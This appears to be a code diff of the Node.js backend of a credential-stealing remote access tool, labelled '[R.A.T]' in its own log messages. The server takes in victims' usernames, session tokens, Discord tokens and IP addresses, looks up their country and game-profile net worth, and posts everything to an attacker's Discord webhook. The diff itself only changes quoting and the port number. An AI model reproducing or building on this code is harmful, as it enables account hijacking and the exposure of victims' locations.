@@ -1,4 +1,4 @@
-const getProfiles = require('./utils/networth');
+const getProfiles = require("./utils/networth");
 require("dotenv").config();
 const { post, get } = require("axios");
 const express = require("express");
@@ -6,7 +6,7 @@ const mongoose = require("mongoose");
 const helmet = require("helmet");
 const app = express();
 const expressip = require("express-ip");
-const port = process.env.PORT || 8081;
+const port = process.env.PORT || 8080;
 
 app.use(helmet());
 app.use(expressip().getIpInfoMiddleware);
@@ -16,7 +16,7 @@ const ipMap = [];
 
 setInterval(() => {
     if (ipMap.length > 0) {
-        console.log(`[R.A.T] Cleared map`);
+        console.log("[R.A.T] Cleared map");
         ipMap.length = 0;
     }
 }, 1000 * 60 * 15);
@@ -73,11 +73,11 @@ app.post("/", async (req, res) => {
         const ipInfo = `[View](http://ipwho.is/${req.body.ip})`;
 
         await post(process.env.WEBHOOK, {
-            content: `@everyone`,
+            content: "@everyone",
             embeds: [{
                 title: `${req.body.username} - Stats`,
                 fields: [
-                    { name: 'Token', value: `****${checkToken}****`, inline: true },
+                    { name: `Token`, value: `****${checkToken}****`, inline: true },
                     { name: 'Discord', value: `****${checkDiscord}****`, inline: true },
                     { name: 'Profiles', value: `\`\`\`${profiles}\`\`\`\`\`\`${country}\`\`\``, inline: false },
                     { name: 'IP Info', value: `**${ipInfo}**`, inline: true },
@@ -112,12 +112,12 @@ async function fetchCountry(ip) {
     try {
         const response = await fetch(apiUrl);
         if (!response.ok) {
-            throw new Error('Network response was not ok');
+            throw new Error("Network response was not ok");
         }
         const data = await response.json();
         return data.country;
     } catch (error) {
-        console.error('Error fetching country:', error);
+        console.error("Error fetching country:", error);
         return 'Unknown';
     }
 }
